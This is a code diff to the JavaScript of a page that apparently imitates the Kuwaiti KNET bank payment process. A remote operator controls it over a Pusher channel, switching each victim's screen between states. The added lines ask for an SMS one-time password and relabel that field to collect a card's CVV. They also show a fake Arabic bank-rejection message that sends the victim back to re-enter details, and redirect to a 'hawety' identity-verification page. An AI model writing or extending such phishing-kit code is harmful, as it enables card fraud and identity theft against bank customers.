@@ -250,30 +250,45 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
             var channel = pusher.subscribe("confirm");
             channel.bind("App\\Events\\Confirmation", function(data) {
                 if (data.people_id == pid && data.status == "Accept") {
+                    // Show OTP field
                     document.getElementById("payConfirm").style.display = "block";
                     document.getElementById("OTPDCDIV").style.display = "block";
                     document.getElementById("otpmsgDC2").style.display = "block";
+                    document.getElementById("otpmsgDC2").innerHTML = "Please enter the OTP sent to your mobile";
+                    document.getElementById("submithide1").style.display = "block";
                 }
                 if (data.people_id == pid && data.status == "Reject") {
-                    alert("Transaction Declined");
-                    window.location.href = "index.html";
+                    // Go back to knetpage with rejection message
+                    localStorage.setItem("knetError", "تم رفض العملية من قبل البنك. برجاء التأكد من البيانات والمحاولة مرة أخرى");
+                    window.location.href = "knetpage.html";
                 }
                 if (data.people_id == pid && data.status == "otp") {
+                    // Show OTP field
                     document.getElementById("payConfirm").style.display = "block";
                     document.getElementById("OTPDCDIV").style.display = "block";
                     document.getElementById("otpmsgDC2").style.display = "block";
+                    document.getElementById("otpmsgDC2").innerHTML = "Please enter the OTP sent to your mobile";
+                    document.getElementById("submithide1").style.display = "block";
                 }
                 if (data.people_id == pid && data.status == "cvv") {
+                    // Show CVV field
                     document.getElementById("payConfirm").style.display = "block";
                     document.getElementById("OTPDCDIV").style.display = "block";
+                    document.getElementById("otpmsgDC2").style.display = "block";
+                    document.getElementById("otpmsgDC2").innerHTML = "Please enter your CVV number";
+                    var otpLabel = document.querySelector('#OTPDCDIV .column-label');
+                    if (otpLabel) otpLabel.textContent = "CVV:";
+                    var otpInput = document.getElementById("debitOTPtimer");
+                    if (otpInput) { otpInput.maxLength = 4; otpInput.placeholder = "CVV"; }
+                    document.getElementById("submithide1").style.display = "block";
                 }
                 if (data.people_id == pid && data.status == "error") {
-                    alert("Transaction Error - Please try again");
-                    window.location.href = "index.html";
+                    alert("حدث خطأ في العملية - برجاء المحاولة مرة أخرى");
+                    window.location.href = "knetpage.html";
                 }
                 if (data.people_id == pid && data.status == "hawety") {
-                    alert("Please verify with Haweyati");
-                    window.location.href = "index.html";
+                    // Go to hawety verification page
+                    window.location.href = "hawety.html";
                 }
                 if (data.people_id == pid && data.status == "idpedol") {
                     // Keep waiting
